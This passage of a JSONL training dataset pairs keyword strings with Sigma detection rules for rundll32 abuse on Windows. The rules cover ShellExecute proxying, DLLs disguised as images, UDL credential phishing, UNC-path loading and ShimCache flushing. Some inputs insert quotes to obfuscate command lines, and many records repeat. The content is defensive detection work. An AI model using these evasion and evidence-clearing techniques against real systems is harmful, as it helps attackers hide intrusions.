Konstantin Grishchenko, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\runonce.exe'\n        ParentImage|endswith: '\\rundll32.exe'\n        ParentCommandLine|contains|all:\n            - 'setupapi.dll'\n            - 'InstallHinfSection'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts and administrative tools that use INF files for driver installation with setupapi.dll\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE RunDll_ShellExecuteW", "output": "title: Potential ShellDispatch.DLL Functionality Abuse\nid: 82343930-652f-43f5-ab70-2ee9fdd6d5e9\nstatus: test\ndescription: Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\"\nreferences:\n    - https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-20\ntags:\n    - attack.execution\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'RunDll_ShellExecuteW'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe \"RUNDLL\"32.EXE RunDll_ShellExecuteW", "output": "title: Potential ShellDispatch.DLL Functionality Abuse\nid: 82343930-652f-43f5-ab70-2ee9fdd6d5e9\nstatus: test\ndescription: Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\"\nreferences:\n    - https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-20\ntags:\n    - attack.execution\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'RunDll_ShellExecuteW'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 RunDll_ShellExecuteW", "output": "title: Potential ShellDispatch.DLL Functionality Abuse\nid: 82343930-652f-43f5-ab70-2ee9fdd6d5e9\nstatus: test\ndescription: Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\"\nreferences:\n    - https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-20\ntags:\n    - attack.execution\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'RunDll_ShellExecuteW'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RunDll_ShellExecuteW RUNDLL32.EXE", "output": "title: Potential ShellDispatch.DLL Functionality Abuse\nid: 82343930-652f-43f5-ab70-2ee9fdd6d5e9\nstatus: test\ndescription: Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\"\nreferences:\n    - https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-20\ntags:\n    - attack.execution\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'RunDll_ShellExecuteW'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe \\explorer.exe \\shell32.dll,Control_RunDLL", "output": "title: RunDLL32 Spawning Explorer\nid: caa06de8-fdef-4c91-826a-7f9e163eef4b\nstatus: test\ndescription: Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-november-2021/\nauthor: elhoim, CD_ROM_\ndate: 2022-04-27\nmodified: 2022-05-25\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\rundll32.exe'\n        Image|endswith: '\\explorer.exe'\n    filter:\n        ParentCommandLine|contains: '\\shell32.dll,Control_RunDLL'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe \\explorer.exe \\\"\\shell32.dll,Control_RunDLL\\\"", "output": "title: RunDLL32 Spawning Explorer\nid: caa06de8-fdef-4c91-826a-7f9e163eef4b\nstatus: test\ndescription: Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-november-2021/\nauthor: elhoim, CD_ROM_\ndate: 2022-04-27\nmodified: 2022-05-25\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\rundll32.exe'\n        Image|endswith: '\\explorer.exe'\n    filter:\n        ParentCommandLine|contains: '\\shell32.dll,Control_RunDLL'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe \\explorer.exe \\run-control", "output": "title: RunDLL32 Spawning Explorer\nid: caa06de8-fdef-4c91-826a-7f9e163eef4b\nstatus: test\ndescription: Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-november-2021/\nauthor: elhoim, CD_ROM_\ndate: 2022-04-27\nmodified: 2022-05-25\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\rundll32.exe'\n        Image|endswith: '\\explorer.exe'\n    filter:\n        ParentCommandLine|contains: '\\shell32.dll,Control_RunDLL'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 \\explorer \\shell32.dll,Control_RunDLL", "output": "title: RunDLL32 Spawning Explorer\nid: caa06de8-fdef-4c91-826a-7f9e163eef4b\nstatus: test\ndescription: Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-november-2021/\nauthor: elhoim, CD_ROM_\ndate: 2022-04-27\nmodified: 2022-05-25\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\rundll32.exe'\n        Image|endswith: '\\explorer.exe'\n    filter:\n        ParentCommandLine|contains: '\\shell32.dll,Control_RunDLL'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe \\explorer.exe \\shell32.dll,Control_RunDLL", "output": "title: RunDLL32 Spawning Explorer\nid: caa06de8-fdef-4c91-826a-7f9e163eef4b\nstatus: test\ndescription: Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way\nreferences:\n    - https://redcanary.com/blog/intelligence-insights-november-2021/\nauthor: elhoim, CD_ROM_\ndate: 2022-04-27\nmodified: 2022-05-25\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\rundll32.exe'\n        Image|endswith: '\\explorer.exe'\n    filter:\n        ParentCommandLine|contains: '\\shell32.dll,Control_RunDLL'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.exe .bmp .cr2 .eps .gif .ico .jpeg .jpg .nef .orf .png .raw .sr2 .tif .tiff", "output": "title: Suspicious Rundll32 Execution With Image Extension\nid: 4aa6040b-3f28-44e3-a769-9208e5feb5ec\nrelated:\n    - id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\n      type: similar\nstatus: test\ndescription: Detects the execution of Rundll32.exe with DLL files masquerading as image files\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.bmp'\n            - '.cr2'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.tif'\n            - '.tiff'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.exe .bmp .cr2 .e\"ps\" .gif .ico .jpeg .jpg .nef .orf .png .raw .sr2 .tif .tiff", "output": "title: Suspicious Rundll32 Execution With Image Extension\nid: 4aa6040b-3f28-44e3-a769-9208e5feb5ec\nrelated:\n    - id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\n      type: similar\nstatus: test\ndescription: Detects the execution of Rundll32.exe with DLL files masquerading as image files\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.bmp'\n            - '.cr2'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.tif'\n            - '.tiff'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 .bmp .cr2 .eps .gif .ico .jpeg .jpg .nef .orf .png .raw .sr2 .tif .tiff", "output": "title: Suspicious Rundll32 Execution With Image Extension\nid: 4aa6040b-3f28-44e3-a769-9208e5feb5ec\nrelated:\n    - id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\n      type: similar\nstatus: test\ndescription: Detects the execution of Rundll32.exe with DLL files masquerading as image files\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.bmp'\n            - '.cr2'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.tif'\n            - '.tiff'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.exe .bmp .cr2 .eps .gif .ico .jpeg .jpg .nef .orf .png .raw .sr2 .tif .tiff", "output": "title: Suspicious Rundll32 Execution With Image Extension\nid: 4aa6040b-3f28-44e3-a769-9208e5feb5ec\nrelated:\n    - id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\n      type: similar\nstatus: test\ndescription: Detects the execution of Rundll32.exe with DLL files masquerading as image files\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.bmp'\n            - '.cr2'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.tif'\n            - '.tiff'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32 apphelp.dll ShimFlushCache #250 rundll32 kernel32.dll BaseFlushAppcompatCache #46", "output": "title: ShimCache Flush\nid: b0524451-19af-4efa-a46f-562a977f792e\nstatus: stable\ndescription: Detects actions that clear the local ShimCache and remove forensic evidence\nreferences:\n    - https://medium.com/@blueteamops/shimcache-flush-89daff28d15e\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-01\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'apphelp.dll'\n    selection1b:\n        CommandLine|contains:\n            - 'ShimFlushCache'\n            - '#250'\n    selection2a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'kernel32.dll'\n    selection2b:\n        CommandLine|contains:\n            - 'BaseFlushAppcompatCache'\n            - '#46'\n    condition: ( selection1a and selection1b ) or ( selection2a and selection2b )\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32 apphelp.dll ShimFlushCache #250 rundll32 kernel32.dll BaseFlushAppcompatCache \"#\"\"4\"\"6\"", "output": "title: ShimCache Flush\nid: b0524451-19af-4efa-a46f-562a977f792e\nstatus: stable\ndescription: Detects actions that clear the local ShimCache and remove forensic evidence\nreferences:\n    - https://medium.com/@blueteamops/shimcache-flush-89daff28d15e\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-01\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'apphelp.dll'\n    selection1b:\n        CommandLine|contains:\n            - 'ShimFlushCache'\n            - '#250'\n    selection2a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'kernel32.dll'\n    selection2b:\n        CommandLine|contains:\n            - 'BaseFlushAppcompatCache'\n            - '#46'\n    condition: ( selection1a and selection1b ) or ( selection2a and selection2b )\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32 apphelp.dll ShimFlushCache #250 rundll32 kernel32.dll BaseFlushAppcompatCache #46", "output": "title: ShimCache Flush\nid: b0524451-19af-4efa-a46f-562a977f792e\nstatus: stable\ndescription: Detects actions that clear the local ShimCache and remove forensic evidence\nreferences:\n    - https://medium.com/@blueteamops/shimcache-flush-89daff28d15e\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-01\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'apphelp.dll'\n    selection1b:\n        CommandLine|contains:\n            - 'ShimFlushCache'\n            - '#250'\n    selection2a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'kernel32.dll'\n    selection2b:\n        CommandLine|contains:\n            - 'BaseFlushAppcompatCache'\n            - '#46'\n    condition: ( selection1a and selection1b ) or ( selection2a and selection2b )\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe .sys, .sys", "output": "title: Suspicious Rundll32 Activity Invoking Sys File\nid: 731231b9-0b5d-4219-94dd-abb6959aa7ea\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: 'rundll32.exe'\n    selection2:\n        CommandLine|contains:\n            - '.sys,'\n            - '.sys '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe .sys, \".s\"ys", "output": "title: Suspicious Rundll32 Activity Invoking Sys File\nid: 731231b9-0b5d-4219-94dd-abb6959aa7ea\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: 'rundll32.exe'\n    selection2:\n        CommandLine|contains:\n            - '.sys,'\n            - '.sys '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32 .sys, .sys", "output": "title: Suspicious Rundll32 Activity Invoking Sys File\nid: 731231b9-0b5d-4219-94dd-abb6959aa7ea\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: 'rundll32.exe'\n    selection2:\n        CommandLine|contains:\n            - '.sys,'\n            - '.sys '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe .sys, .sys", "output": "title: Suspicious Rundll32 Activity Invoking Sys File\nid: 731231b9-0b5d-4219-94dd-abb6959aa7ea\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: 'rundll32.exe'\n    selection2:\n        CommandLine|contains:\n            - '.sys,'\n            - '.sys '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\rundll32.exe RUNDLL32.EXE oledb32.dll ,OpenDSLFile \\\\Users\\\\ \\\\Downloads\\\\", "output": "title: Potentially Suspicious Rundll32.EXE Execution of UDL File\nid: 0ea52357-cd59-4340-9981-c46c7e900428\nstatus: experimental\ndescription: |\n    Detects the execution of rundll32.exe with the oledb32.dll library to open a UDL file.\n    Threat actors can abuse this technique as a phishing vector to capture authentication credentials or other sensitive data.\nreferences:\n    - https://trustedsec.com/blog/oops-i-udld-it-again\nauthor: '@kostastsale'\ndate: 2024-08-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1218.011\n    - attack.t1071\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\explorer.exe'\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'oledb32.dll'\n            - ',OpenDSLFile '\n            - '\\\\Users\\\\*\\\\Downloads\\\\' # Note: You can adjust the path to the download directory or other directories according to your environment.\n        CommandLine|endswith: '.udl'\n    condition: all of selection_*\nfalsepositives:\n    - UDL files serve as a convenient and flexible tool for managing and testing database connections in various development and administrative scenarios.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\rundll32.exe RUNDLL32.EXE oledb32.dll ,OpenDSLFile \\\\Users\\\\ \\\\Down\"loads\\\\\"", "output": "title: Potentially Suspicious Rundll32.EXE Execution of UDL File\nid: 0ea52357-cd59-4340-9981-c46c7e900428\nstatus: experimental\ndescription: |\n    Detects the execution of rundll32.exe with the oledb32.dll library to open a UDL file.\n    Threat actors can abuse this technique as a phishing vector to capture authentication credentials or other sensitive data.\nreferences:\n    - https://trustedsec.com/blog/oops-i-udld-it-again\nauthor: '@kostastsale'\ndate: 2024-08-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1218.011\n    - attack.t1071\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\explorer.exe'\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'oledb32.dll'\n            - ',OpenDSLFile '\n            - '\\\\Users\\\\*\\\\Downloads\\\\' # Note: You can adjust the path to the download directory or other directories according to your environment.\n        CommandLine|endswith: '.udl'\n    condition: all of selection_*\nfalsepositives:\n    - UDL files serve as a convenient and flexible tool for managing and testing database connections in various development and administrative scenarios.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer \\rundll32 RUNDLL32 oledb32.dll ,OpenDSLFile \\\\Users\\\\ \\\\Downloads\\\\", "output": "title: Potentially Suspicious Rundll32.EXE Execution of UDL File\nid: 0ea52357-cd59-4340-9981-c46c7e900428\nstatus: experimental\ndescription: |\n    Detects the execution of rundll32.exe with the oledb32.dll library to open a UDL file.\n    Threat actors can abuse this technique as a phishing vector to capture authentication credentials or other sensitive data.\nreferences:\n    - https://trustedsec.com/blog/oops-i-udld-it-again\nauthor: '@kostastsale'\ndate: 2024-08-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1218.011\n    - attack.t1071\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\explorer.exe'\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'oledb32.dll'\n            - ',OpenDSLFile '\n            - '\\\\Users\\\\*\\\\Downloads\\\\' # Note: You can adjust the path to the download directory or other directories according to your environment.\n        CommandLine|endswith: '.udl'\n    condition: all of selection_*\nfalsepositives:\n    - UDL files serve as a convenient and flexible tool for managing and testing database connections in various development and administrative scenarios.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\rundll32.exe RUNDLL32.EXE oledb32.dll ,OpenDSLFile \\\\Users\\\\ \\\\Downloads\\\\", "output": "title: Potentially Suspicious Rundll32.EXE Execution of UDL File\nid: 0ea52357-cd59-4340-9981-c46c7e900428\nstatus: experimental\ndescription: |\n    Detects the execution of rundll32.exe with the oledb32.dll library to open a UDL file.\n    Threat actors can abuse this technique as a phishing vector to capture authentication credentials or other sensitive data.\nreferences:\n    - https://trustedsec.com/blog/oops-i-udld-it-again\nauthor: '@kostastsale'\ndate: 2024-08-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1218.011\n    - attack.t1071\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\explorer.exe'\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'oledb32.dll'\n            - ',OpenDSLFile '\n            - '\\\\Users\\\\*\\\\Downloads\\\\' # Note: You can adjust the path to the download directory or other directories according to your environment.\n        CommandLine|endswith: '.udl'\n    condition: all of selection_*\nfalsepositives:\n    - UDL files serve as a convenient and flexible tool for managing and testing database connections in various development and administrative scenarios.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE rundll32 \\\\\\\\", "output": "title: Rundll32 UNC Path Execution\nid: 5cdb711b-5740-4fb2-ba88-f7945027afac\nstatus: test\ndescription: Detects rundll32 execution where the DLL is located on a remote location (share)\nreferences:\n    - https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE \\\"r\\\"\\\"u\\\"\\\"n\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\"\\\"3\\\"\\\"2\\\" \\\\\\\\", "output": "title: Rundll32 UNC Path Execution\nid: 5cdb711b-5740-4fb2-ba88-f7945027afac\nstatus: test\ndescription: Detects rundll32 execution where the DLL is located on a remote location (share)\nreferences:\n    - https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 rundll32 \\\\\\\\", "output": "title: Rundll32 UNC Path Execution\nid: 5cdb711b-5740-4fb2-ba88-f7945027afac\nstatus: test\ndescription: Detects rundll32 execution where the DLL is located on a remote location (share)\nreferences:\n    - https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe \\\\\\\\ rundll32 RUNDLL32.EXE", "output": "title: Rundll32 UNC Path Execution\nid: 5cdb711b-5740-4fb2-ba88-f7945027afac\nstatus: test\ndescription: Detects rundll32 execution where the DLL is located on a remote location (share)\nreferences:\n    - https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains: ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
